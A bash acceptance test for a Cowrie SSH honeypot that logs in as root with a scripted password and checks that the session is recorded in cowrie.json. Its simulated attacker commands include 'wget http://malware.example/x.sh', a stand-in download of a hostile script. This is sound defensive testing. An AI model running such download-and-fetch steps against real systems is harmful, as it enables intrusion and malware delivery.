#!/usr/bin/env bash
# Tripwire honeypot — Phase 1 acceptance test.
# Fires a fake SSH login + a few commands at the local honeypot, then proves
# the session landed in cowrie.json.
#
# Usage:  ./test-connection.sh [host] [port]
#   defaults: localhost 2222
set -uo pipefail
cd "$(dirname "$0")"

HOST="${1:-localhost}"
PORT="${2:-2222}"
LOGFILE="var/log/cowrie/cowrie.json"

echo "[*] Target: $HOST:$PORT"

if ! docker ps --format '{{.Names}}' | grep -q '^tripwire-cowrie$'; then
  echo "[!] Container tripwire-cowrie is not running. Start it with: docker compose up -d"
  exit 1
fi

before=$( [ -f "$LOGFILE" ] && wc -l < "$LOGFILE" || echo 0 )

if command -v sshpass >/dev/null 2>&1; then
  echo "[*] Driving an automated SSH session (root / hunter2)..."
  sshpass -p 'hunter2' ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PubkeyAuthentication=no \
    -o ConnectTimeout=10 \
    -p "$PORT" root@"$HOST" 'uname -a; whoami; wget http://malware.example/x.sh; ls -la /' 2>/dev/null || true
else
  echo "[!] sshpass not installed. Run this manually instead, then re-run this script:"
  echo "      ssh -p $PORT root@$HOST      (password: anything, e.g. hunter2)"
  echo "      # then type:  uname -a; whoami; ls -la /   ;  exit"
  read -r -p "    Press Enter once you've completed a manual session... " _
fi

sleep 2
after=$( [ -f "$LOGFILE" ] && wc -l < "$LOGFILE" || echo 0 )
new=$(( after - before ))

echo
echo "[*] New JSON events written: $new"
if [ "$new" -gt 0 ]; then
  echo "[+] PASS — honeypot captured the session. Last events:"
  tail -n 6 "$LOGFILE"
else
  echo "[!] FAIL — no new events in $LOGFILE. Check: docker compose logs cowrie"
  exit 1
fi
